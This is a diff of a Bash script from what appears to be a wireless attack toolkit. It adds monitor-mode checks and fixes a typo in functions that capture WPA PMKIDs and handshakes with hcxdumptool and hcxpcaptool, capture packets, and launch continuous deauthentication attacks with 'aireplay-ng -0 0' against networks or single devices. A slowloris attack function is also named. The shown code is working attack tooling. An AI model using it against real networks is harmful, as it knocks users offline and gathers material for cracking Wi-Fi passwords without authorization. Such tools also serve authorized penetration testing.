@@ -12,9 +12,13 @@ source "lib/edit-files.sh"
 capture-pmkid() {
     clear
     echo "Processing"
+    MODE=$(iwconfig "$INTERFACE" | grep "Mode:" | cut -d":" -f2 | cut -d" " -f1)
+    if [ $MODE != Monitor ]
+    then
     ifconfig "$INTERFACE" down
-    iwconfig "$INTERFACE" mode moniter
+    iwconfig "$INTERFACE" mode monitor
     ifconfig "$INTERFACE" up
+    fi
     network-scan-1
     echo ""
     read -p "File name to save as: " FILE1
@@ -22,18 +26,13 @@ capture-pmkid() {
     echo "During Capture press "CTRL + C" to stop"
     read -n 1 -r -s -p "Press any button to begin capture..."
     clear
-    echo "Processing..."
-    airmon-ng check kill
     hcxdumptool -i "$INTERFACE" -o "$FILE1".pcapng --enable_status=1 -c "$CHANNEL1"
     hcxpcaptool -E essidlist -I identitylist -U usernamelist -z "$FILE1".16800 "$FILE1".pcapng
-    clear
-    cd /etc/init.d/
-    sudo NetworkManager restart
-    cd "$PERM_DIR"
     rm "$FILE1".pcapng PMKID
     mv "$FILE1".16800 PMKID
     rm -R identitylist 2>/dev/null
     rm -R essidlist 2>/dev/null
+    sleep 1
     clear
     echo "Processing"
     ifconfig "$INTERFACE" down
@@ -44,9 +43,13 @@ capture-pmkid() {
 capture-handshake() {
     clear
     echo "Processing"
+    MODE=$(iwconfig "$INTERFACE" | grep "Mode:" | cut -d":" -f2 | cut -d" " -f1)
+    if [ $MODE != Monitor ]
+    then
     ifconfig "$INTERFACE" down
-    iwconfig "$INTERFACE" mode moniter
+    iwconfig "$INTERFACE" mode monitor
     ifconfig "$INTERFACE" up
+    fi
     network-scan-2
     echo ""
     read -p "File name to save as (default is WiFi name): " FILE2
@@ -92,9 +95,13 @@ crack-handshake() {
 capture-packets() {
     clear
     echo "Processing"
+    MODE=$(iwconfig "$INTERFACE" | grep "Mode:" | cut -d":" -f2 | cut -d" " -f1)
+    if [ $MODE != Monitor ]
+    then
     ifconfig "$INTERFACE" down
-    iwconfig "$INTERFACE" mode moniter
+    iwconfig "$INTERFACE" mode monitor
     ifconfig "$INTERFACE" up
+    fi
     network-scan-3
     echo ""
     read -p "File to save as (default is WiFi name): " FILE3
@@ -278,9 +285,13 @@ slowloris-attack() {
 deauth-network() {
     clear
     echo "Processing"
+    MODE=$(iwconfig "$INTERFACE" | grep "Mode:" | cut -d":" -f2 | cut -d" " -f1)
+    if [ $MODE != Monitor ]
+    then
     ifconfig "$INTERFACE" down
-    iwconfig "$INTERFACE" mode moniter
+    iwconfig "$INTERFACE" mode monitor
     ifconfig "$INTERFACE" up
+    fi
     network-scan-4
     clear
     aireplay-ng -0 0 -a $BSSID4 $INTERFACE
@@ -294,9 +305,13 @@ deauth-network() {
 deauth-device() {
     clear
     echo "Processing"
+    MODE=$(iwconfig "$INTERFACE" | grep "Mode:" | cut -d":" -f2 | cut -d" " -f1)
+    if [ $MODE != Monitor ]
+    then
     ifconfig "$INTERFACE" down
-    iwconfig "$INTERFACE" mode moniter
+    iwconfig "$INTERFACE" mode monitor
     ifconfig "$INTERFACE" up
+    fi
     network-scan-5
     device-scan
     choose-device
